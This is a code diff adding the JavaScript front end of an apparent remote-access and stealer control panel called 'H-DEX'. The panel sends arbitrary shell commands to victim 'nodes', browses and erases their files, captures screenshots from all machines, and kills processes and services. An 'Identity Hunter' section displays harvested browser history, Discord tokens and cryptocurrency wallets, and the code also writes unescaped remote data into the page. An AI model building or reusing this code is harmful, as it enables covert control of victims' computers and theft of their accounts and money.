+            document.getElementById('active-device-id').textContent = id;
+            document.getElementById('device-controls').classList.remove('hidden');
+
+            // Sync other selectors
+            const selectors = ['terminal-device', 'file-device', 'screenshot-device'];
+            selectors.forEach(s => {
+                const el = document.getElementById(s);
+                if (el) el.value = id;
+            });
+
+            updateDevicesUI();
+            showToast("NODE ACCESS ESTABLISHED: " + id, "info");
+        }
+
+        function deselectDevice() {
+            selectedDeviceId = null;
+            document.getElementById('device-controls').classList.add('hidden');
+            updateDevicesUI();
+        }
+
+        async function sendCommand(type, extra = {}) {
+            if (!selectedDeviceId) return showToast("SELECT TARGET NODE", "error");
+
+            showToast(`TRANSMITTING ${type.toUpperCase()}...`, "info");
+
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ type, target_id: selectedDeviceId, ...extra }));
+            } else {
+                sendCommandHTTP(selectedDeviceId, type, extra);
+            }
+        }
+
+        async function sendShellCommand() {
+            const cmd = document.getElementById('custom-cmd').value;
+            if (!cmd) return;
+            sendCommand('execute_command', { command: cmd });
+            document.getElementById('custom-cmd').value = '';
+        }
+
+        async function banDevice(id) {
+            if (!confirm(`Permanently exclude node '${id}' from infrastructure?`)) return;
+            await fetch('/manage/settings?token=' + authToken, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ target_id: id, type: 'ban_device', reason: 'POLICY VIOLATION / ADMIN ACTION' })
+            });
+            showToast("NODE EXCLUDED FROM NETWORK", "success");
+            refreshAll();
+        }
+
+        async function unbanDevice(id) {
+            await fetch('/manage/unban?token=' + authToken + '&client_id=' + id, { method: 'POST' });
+            showToast("AUTHORIZATION RESTORED", "success");
+            loadBlacklist();
+        }
+
+        async function toggleKillSwitch(checked) {
+            await fetch('/manage/settings?token=' + authToken + '&kill_switch=' + checked, { method: 'POST' });
+            showToast("KILL SWITCH " + (checked ? "ENGAGED" : "RELEASED"), checked ? "error" : "success");
+            // Update both toggles
+            document.querySelectorAll('[id^="kill-switch-"]').forEach(el => el.checked = checked);
+        }
+
+        async function cleanDatabase() {
+            if (!confirm("Initiate telemetry purge? (History > 7 cycles)")) return;
+            await fetch('/clean_db?token=' + authToken);
+            showToast("TELEMETRY PURGE COMPLETE", "success");
+            loadStats();
+        }
+
+        // --- WEBSOCKET & LIVE UPDATES ---
+        let ws = null;
+        function connectWebSocket() {
+            const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            ws = new WebSocket(`${protocol}//${location.host}/ws`);
+
+            ws.onopen = () => {
+                ws.send(JSON.stringify({ type: 'register_dashboard', token: authToken }));
+                document.getElementById('ws-status').className = 'px-2 py-0.5 bg-blue-500/10 text-blue-500 rounded text-[8px] font-bold uppercase tracking-widest border border-blue-500/20';
+                document.getElementById('ws-status').textContent = 'Live Uplink Online';
+            };
+
+            ws.onmessage = (e) => {
+                const data = JSON.parse(e.data);
+
+                if (data.type === 'device_list') {
+                    devices = data.devices.map(d => ({ ...d, status: 'Online' }));
+                    updateDevicesUI();
+                } else if (data.type === 'process_list') {
+                    handleProcessList(data);
+                } else if (data.type === 'services_list') {
+                    handleServicesList(data);
+                } else if (data.type === 'startup_items') {
+                    handleStartupList(data);
+                } else if (data.type === 'browser_history') {
+                    handleIdentityHistory(data);
+                } else if (data.type === 'discord_tokens') {
+                    handleIdentityTokens(data);
+                } else if (data.type === 'crypto_wallets') {
+                    handleIdentityWallets(data);
+                } else if (data.type === 'command_output') {
+                    handleTerminalOutput(data);
+                } else if (data.type === 'file_list') {
+                    renderFileList(data.files);
+                } else if (data.type === 'screen_frame') {
+                    handleScreenshotData(data);
+                }
+            };
+
+            ws.onclose = () => {
+                document.getElementById('ws-status').className = 'px-2 py-0.5 bg-red-500/10 text-red-500 rounded text-[8px] font-bold uppercase tracking-widest border border-red-500/20';
+                document.getElementById('ws-status').textContent = 'Uplink Disconnected';
+                setTimeout(connectWebSocket, 5000);
+            };
+        }
+
+        function handleTerminalOutput(data) {
+            const output = document.getElementById('terminal-output');
+            if (currentTab === 'terminal' && data.sender_id === document.getElementById('terminal-device').value) {
+                const p = document.createElement('div');
+                p.className = 'text-neutral-300 mt-1';
+                p.innerHTML = `<span class="text-neutral-600">[${data.sender_id}]</span> ${data.output.replace(/\n/g, '<br>')}`;
+                output.appendChild(p);
+                output.scrollTop = output.scrollHeight;
+            } else {
+                showToast(`TEL-INTEL FROM ${data.sender_id}`, "info");
+            }
+        }
+
+        // --- TERMINAL ---
+        function runTerminalCommand() {
+            const id = document.getElementById('terminal-device').value;
+            const cmd = document.getElementById('terminal-input').value;
+            if (!id || !cmd) return;
+
+            const output = document.getElementById('terminal-output');
+            const p = document.createElement('div');
+            p.className = 'text-blue-500 font-bold mt-4';
+            p.innerHTML = `>>> ${cmd}`;
+            output.appendChild(p);
+
+            ws.send(JSON.stringify({ type: 'execute_command', target_id: id, command: cmd }));
+            document.getElementById('terminal-input').value = '';
+            output.scrollTop = output.scrollHeight;
+        }
+
+        function updateTerminalDevices() {
+            const sel = document.getElementById('terminal-device');
+            const val = sel.value;
+            sel.innerHTML = '<option value="">Select Node</option>' + devices.map(d => `<option value="${d.id}">${d.name || d.id}</option>`).join('');
+            sel.value = val;
+        }
+
+        // --- FILE BROWSER ---
+        let currentFilePath = 'C:\\';
+        function updateFileDevices() {
+            const sel = document.getElementById('file-device');
+            const val = sel.value;
+            sel.innerHTML = '<option value="">Select Node</option>' + devices.map(d => `<option value="${d.id}">${d.name || d.id}</option>`).join('');
+            sel.value = val;
+        }
+
+        function browseFiles(path) {
+            const id = document.getElementById('file-device').value;
+            if (!id) return;
+            currentFilePath = path;
+            document.getElementById('file-path').value = path;
+            document.getElementById('file-list').innerHTML = '<div class="px-6 py-20 text-center text-[10px] text-neutral-600 uppercase tracking-widest">Initialising directory scan...</div>';
+            ws.send(JSON.stringify({ type: 'list_files', target_id: id, path }));
+        }
+
+        function renderFileList(files) {
+            const list = document.getElementById('file-list');
+            if (!files || !files.length) {
+                list.innerHTML = '<div class="px-6 py-20 text-center text-[10px] text-neutral-700">Access Denied or Empty Path</div>';
+                return;
+            }
+            list.innerHTML = files.map(f => `
+                <div class="px-6 py-3 flex items-center justify-between group hover:bg-neutral-900/40 transition-colors cursor-pointer" onclick="if('${f.is_dir}' === 'true') browseFiles('${currentFilePath}${f.name}\\\\')">
+                    <div class="flex items-center gap-4">
+                        <i class="fas fa-${f.is_dir ? 'folder text-neutral-600' : 'file text-neutral-700'} text-xs"></i>
+                        <span class="text-[10px] uppercase font-bold tracking-tight text-neutral-400 group-hover:text-blue-500 transition-colors">${f.name}</span>
+                    </div>
+                    <div class="flex items-center gap-6">
+                        <span class="text-[9px] font-mono text-neutral-700 uppercase">${f.size || ''}</span>
+                        <div class="flex gap-2 opacity-0 group-hover:opacity-100 transition-opacity">
+                            ${!f.is_dir ? `<button title="Retrieve" class="p-1.5 hover:bg-blue-600/10 rounded"><i class="fas fa-download text-[9px] text-blue-500"></i></button>` : ''}
+                            <button title="Erase" class="p-1.5 hover:bg-red-600/10 rounded"><i class="fas fa-trash-alt text-[9px] text-red-500"></i></button>
+                        </div>
+                    </div>
+                </div>
+            `).join('');
+        }
+
+        // --- VISUAL INTEL (SCREENSHOTS) ---
+        let capturedScreens = [];
+        function updateScreenshotDevices() {
+            const sel = document.getElementById('screenshot-device');
+            const val = sel.value;
+            sel.innerHTML = '<option value="">All Nodes</option>' + devices.map(d => `<option value="${d.id}">${d.name || d.id}</option>`).join('');
+            sel.value = val;
+        }
+
+        function handleScreenshotData(data) {
+            capturedScreens.unshift(data);
+            updateScreenshotGallery();
+        }
+
+        function updateScreenshotGallery() {
+            const gallery = document.getElementById('screenshot-gallery');
+            if (!capturedScreens.length) return;
+            gallery.innerHTML = capturedScreens.map((s, i) => `
+                <div class="card overflow-hidden group cursor-pointer" onclick="viewScreenshot(${i})">
+                    <div class="aspect-video bg-neutral-900 overflow-hidden">
+                        <img src="data:image/png;base64,${s.data}" class="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500 filter brightness-75 group-hover:brightness-100">
+                    </div>
+                     <div class="p-4 bg-neutral-950 border-t border-neutral-900 flex justify-between items-center">
+                          <div>
+                             <p class="text-[10px] font-bold uppercase tracking-tight text-neutral-400">${s.sender_id}</p>
+                             <p class="text-[8px] font-mono text-neutral-600 mt-0.5">${new Date().toLocaleTimeString()}</p>
+                          </div>
+                          <div class="flex gap-3">
+                              <button onclick="event.stopPropagation(); downloadScreenshot(${i})" class="text-neutral-700 hover:text-blue-500 transition-colors">
+                                  <i class="fas fa-download text-[10px]"></i>
+                              </button>
+                              <i class="fas fa-expand-alt text-neutral-700 group-hover:text-blue-500 transition-colors text-[10px]"></i>
+                          </div>
+                     </div>
+                </div>
+            `).join('');
+        }
+
+        function viewScreenshot(idx) {
+            const s = capturedScreens[idx];
+            const modal = document.createElement('div');
+            modal.className = 'fixed inset-0 bg-black/95 backdrop-blur-sm z-[100] flex items-center justify-center p-8 animate-in fade-in duration-300';
+            modal.onclick = () => modal.remove();
+            modal.innerHTML = `
+                <div class="relative max-w-6xl w-full">
+                    <img src="data:image/png;base64,${s.data}" class="w-full rounded border border-neutral-800 shadow-2xl">
+                    <div class="absolute top-4 right-4 bg-black/60 px-4 py-2 rounded border border-neutral-700/50 flex items-center gap-3">
+                         <span class="text-[10px] font-bold uppercase text-neutral-300">${s.sender_id}</span>
+                         <div class="w-px h-3 bg-neutral-700"></div>
+                         <button onclick="event.stopPropagation(); downloadScreenshot(${idx})" class="text-neutral-500 hover:text-blue-500"><i class="fas fa-download"></i></button>
+                         <button class="text-neutral-500 hover:text-white"><i class="fas fa-times"></i></button>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(modal);
+        }
+
+        function captureAllScreenshots() {
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                ws.send(JSON.stringify({ type: 'take_screenshot', target_id: 'ALL' }));
+                showToast("GLOBAL VISUAL CAPTURE INITIATED", "success");
+            }
+        }
+
+        function downloadScreenshot(idx) {
+            const s = capturedScreens[idx];
+            if (!s) return;
+            const link = document.createElement('a');
+            link.href = `data:image/png;base64,${s.data}`;
+            link.download = `H-DEX-IMG-${s.sender_id}-${Date.now()}.png`;
+            link.click();
+            showToast("TELEMETRY ARTIFACT DOWNLOADED", "success");
+        }
+
+        async function exportDevicesPDF() {
+            if (!devices.length) return showToast("NO ACTIVE NODES TO REPORT", "error");
+
+            showToast("GENERATING INTELLIGENCE REPORT...", "info");
+
+            const { jsPDF } = window.jspdf;
+            const doc = new jsPDF();
+
+            // Header
+            doc.setFillColor(15, 15, 15);
+            doc.rect(0, 0, 210, 40, 'F');
+            doc.setTextColor(255, 255, 255);
+            doc.setFontSize(22);
+            doc.text('H-DEX FLEET INTELLIGENCE', 15, 20);
+            doc.setFontSize(10);
+            doc.setTextColor(150, 150, 150);
+            doc.text('SENSITIVE INFRASTRUCTURE REPORT // AUTO-GENERATED', 15, 30);
+
+            const rows = devices.map(d => [
+                d.name || 'ANONYMOUS',
+                d.id,
+                d.ip || '0.0.0.0',
+                d.os || 'UNKNOWN',
+                d.status || 'DARK',
+                new Date(d.last_seen || Date.now()).toLocaleString()
+            ]);
+
+            doc.autoTable({
+                startY: 50,
+                head: [['NODE NAME', 'HW-ID', 'NETWORK ADDR', 'OS SYSTEM', 'STATUS', 'LAST TELEMETRY']],
+                body: rows,
+                theme: 'striped',
+                headStyles: { fillColor: [59, 130, 246], fontSize: 8, fontStyle: 'bold' },
+                bodyStyles: { fontSize: 8, font: 'courier' },
+                alternateRowStyles: { fillColor: [245, 245, 245] }
+            });
+
+            // Footer
+            const totalPages = doc.internal.getNumberOfPages();
+            for (let i = 1; i <= totalPages; i++) {
+                doc.setPage(i);
+                doc.setFontSize(8);
+                doc.setTextColor(100, 100, 100);
+                doc.text(`Page ${i} of ${totalPages} // Timestamp: ${new Date().toISOString()}`, 15, 285);
+            }
+
+            doc.save('H-DEX-FLEET-REPORT.pdf');
+            showToast("INTELLIGENCE REPORT GENERATED", "success");
+        }
+
+        // --- PROCESS MANAGEMENT ---
+        let currentProcessList = [];
+
+        function loadProcesses() {
+            if (!selectedDeviceId) return showToast("SELECT TARGET NODE", "error");
+            sendCommand('get_processes');
+            showToast("ENUMERATING REMOTE PROCESSES...", "info");
+        }
+
+        function handleProcessList(data) {
+            if (data.sender_id !== selectedDeviceId) return;
+
+            currentProcessList = data.processes || [];
+            renderProcessTable(currentProcessList);
+            showToast(`RECEIVED ${currentProcessList.length} PROCESS ENTRIES`, "success");
+        }
+
+        function renderProcessTable(procs) {
+            const tbody = document.getElementById('process-table');
+            if (!procs.length) {
+                tbody.innerHTML = '<tr><td colspan="3" class="px-6 py-4 text-center text-[10px] text-neutral-500">No processes found</td></tr>';
+                return;
+            }
+
+            tbody.innerHTML = procs.map(p => `
+                <tr class="hover:bg-white/[0.02] transition-colors group">
+                    <td class="px-6 py-3 font-mono text-[10px] text-neutral-500">${p.pid}</td>
+                    <td class="px-6 py-3">
+                        <div class="flex items-center gap-3">
+                            <i class="fas fa-microchip text-neutral-700 text-[10px] group-hover:text-blue-500 transition-colors"></i>
+                            <span class="text-[10px] font-bold text-neutral-300 uppercase tracking-tight">${p.name}</span>
+                        </div>
+                    </td>
+                    <td class="px-6 py-3 text-right">
+                        <button onclick="killProcess(${p.pid}, '${p.name}')" 
+                                class="px-2 py-1 bg-red-900/20 border border-red-900/40 rounded text-red-500 text-[8px] font-bold uppercase tracking-widest hover:bg-red-900 hover:text-white transition-all opacity-0 group-hover:opacity-100">
+                            Terminate
+                        </button>
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        function filterProcesses() {
+            const query = document.getElementById('process-search').value.toLowerCase();
+            const filtered = currentProcessList.filter(p =>
+                p.name.toLowerCase().includes(query) || p.pid.toString().includes(query)
+            );
+            renderProcessTable(filtered);
+        }
+
+        function killProcess(pid, name) {
+            if (!confirm(`Terminate process '${name}' (PID: ${pid})?`)) return;
+            sendCommand('kill_process', { pid: pid });
+            showToast(`TERMINATION SIGNAL SENT: ${name}`, "warning");
+            // Optional: Remove from UI immediately for better feel
+            currentProcessList = currentProcessList.filter(p => p.pid !== pid);
+            renderProcessTable(currentProcessList);
+        }
+
+        // --- SERVICE & STARTUP & MISC ---
+        let currentServices = [];
+
+        function loadServices() {
+            if (!selectedDeviceId) return;
+            sendCommand('get_services');
+            showToast("QUERYING SERVICE ARCHITECTURE...", "info");
+        }
+
+        function handleServicesList(data) {
+            if (data.sender_id !== selectedDeviceId) return;
+            currentServices = data.services || [];
+            renderServiceTable(currentServices);
+        }
+
+        function renderServiceTable(services) {
+            const tbody = document.getElementById('service-table');
+            tbody.innerHTML = services.map(s => `
+                <tr class="hover:bg-white/[0.02]">
+                    <td class="px-6 py-3 font-bold text-neutral-400 text-[10px] uppercase">${s.name}</td>
+                    <td class="px-6 py-3">
+                        <span class="px-2 py-0.5 rounded text-[8px] font-bold uppercase ${s.status === 'Running' ? 'bg-green-500/10 text-green-500 border border-green-500/20' : 'bg-red-500/10 text-red-500 border border-red-500/20'}">
+                            ${s.status}
+                        </span>
+                    </td>
+                    <td class="px-6 py-3 text-right">
+                        <button onclick="serviceAction('${s.name}', '${s.status === 'Running' ? 'stop' : 'start'}')" 
+                                class="text-[8px] font-bold uppercase text-blue-500 hover:text-white transition-colors">
+                            ${s.status === 'Running' ? 'Stop' : 'Start'}
+                        </button>
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        function filterServices() {
+            const query = document.getElementById('service-search').value.toLowerCase();
+            const filtered = currentServices.filter(s => s.name.toLowerCase().includes(query));
+            renderServiceTable(filtered);
+        }
+
+        function serviceAction(name, action) {
+            sendCommand('service_action', { name, action });
+            showToast(`SERVICE SIGNAL SENT: ${action.toUpperCase()} ${name}`, "warning");
+        }
+
+        function loadStartup() {
+            if (!selectedDeviceId) return;
+            sendCommand('get_startup');
+            showToast("SCANNING AUTO-LAUNCH DEPOT...", "info");
+        }
+
+        function handleStartupList(data) {
+            if (data.sender_id !== selectedDeviceId) return;
+            const tbody = document.getElementById('startup-table');
+            const items = data.items || [];
+            tbody.innerHTML = items.map(path => `
+                <tr class="hover:bg-white/[0.02]">
+                    <td class="px-6 py-3 font-mono text-[9px] text-neutral-500">${path}</td>
+                    <td class="px-6 py-3 text-right">
+                        <button onclick="deleteStartup('${path}')" class="text-red-500 hover:text-white text-[8px] font-bold uppercase">Purge</button>
+                    </td>
+                </tr>
+            `).join('');
+        }
+
+        function deleteStartup(path) {
+            if (!confirm(`Permanently remove auto-launch item?`)) return;
+            sendCommand('delete_startup', { path });
+            showToast("STARTUP ITEM PURGED", "success");
+        }
+
+        function sendTTS() {
+            const text = document.getElementById('tts-input').value;
+            if (!text) return;
+            sendCommand('speak', { text });
+            document.getElementById('tts-input').value = '';
+            showToast("VOICE SYNTHESIS TRANSMITTED", "info");
+        }
+
+        // --- IDENTITY HUNTER ---
+        function handleIdentityHistory(data) {
+            if (data.sender_id !== selectedDeviceId) return;
+            const container = document.getElementById('identity-history');
+            const history = data.data || [];
+            if (!history.length) {
+                container.innerHTML = '<p class="text-[10px] text-neutral-700 italic">No telemetry data available</p>';
+                return;
+            }
+            container.innerHTML = history.slice(0, 20).map(h => `
+                <div class="p-2 bg-neutral-950 rounded border border-neutral-900">
+                    <p class="text-[9px] text-blue-500 font-bold truncate">${h.title || 'Untitled'}</p>
+                    <p class="text-[8px] text-neutral-600 truncate">${h.url}</p>
+                </div>
+            `).join('');
+            showToast("BROWSER TELEMETRY RECOVERED", "success");
+        }
+
+        function handleIdentityTokens(data) {
+            if (data.sender_id !== selectedDeviceId) return;
+            const container = document.getElementById('identity-tokens');
+            const tokens = data.tokens || [];
+            if (!tokens.length) {
+                container.innerHTML = '<p class="text-[10px] text-neutral-700 italic">No communication tokens found</p>';
+                return;
+            }
+            container.innerHTML = tokens.map(t => `
+                <div class="p-2 bg-neutral-950 rounded border border-neutral-900 border-l-purple-900">
+                    <p class="text-[9px] text-purple-500 font-bold uppercase tracking-widest">${t.service}</p>
+                    <p class="text-[8px] text-neutral-500 font-mono break-all">${t.token.substring(0, 20)}...</p>
+                </div>
+            `).join('');
+            showToast("COMMUNICATION TOKENS HARVESTED", "success");
+        }
+
+        function handleIdentityWallets(data) {
+            if (data.sender_id !== selectedDeviceId) return;
+            const container = document.getElementById('identity-wallets');
+            const wallets = data.wallets || [];
+            if (!wallets.length) {
+                container.innerHTML = '<p class="text-[10px] text-neutral-700 italic">No financial assets discovered</p>';
+                return;
+            }
+            container.innerHTML = wallets.map(w => `
+                <div class="p-2 bg-neutral-950 rounded border border-neutral-900 border-l-amber-900">
+                    <p class="text-[9px] text-amber-500 font-bold uppercase tracking-widest">${w.name}</p>
+                    <p class="text-[8px] text-neutral-500 font-mono truncate">${w.path}</p>
+                </div>
+            `).join('');
+            showToast("FINANCIAL ASSETS CATALOGUED", "success");
+        }
+
+        // --- UTILS ---
+        function showToast(message, type = 'info') {
+            const colors = { success: 'border-blue-500 text-blue-500', error: 'border-red-500 text-red-500', info: 'border-neutral-700 text-neutral-400' };
+            const toast = document.createElement('div');
+            toast.className = `px-6 py-4 bg-neutral-950 border ${colors[type]} rounded shadow-2xl flex items-center gap-4 animate-in slide-in-from-right-10 duration-300`;
+            toast.innerHTML = `
+                <div class="w-1.5 h-1.5 rounded-full ${type === 'error' ? 'bg-red-500' : 'bg-blue-500'}"></div>
+                <span class="text-[10px] font-bold uppercase tracking-widest leading-none">${message}</span>
+            `;
+            document.getElementById('toast-container').appendChild(toast);
+            setTimeout(() => {
+                toast.classList.add('animate-out', 'fade-out', 'slide-out-to-right-10');
+                setTimeout(() => toast.remove(), 300);
+            }, 5000);
+        }
+
+        // --- LIFECYCLE ---
+        window.onload = () => {
+            if (authToken) {
+                fetch('/stats?token=' + authToken).then(res => {
+                    if (res.status === 200) {
+                        document.getElementById('login-modal').classList.add('hidden');
+                        document.getElementById('main-app').classList.remove('hidden');
+                        initApp();
+                    }
+                });
+            }
+        };
+    </script>
+</body>
+
+</html>
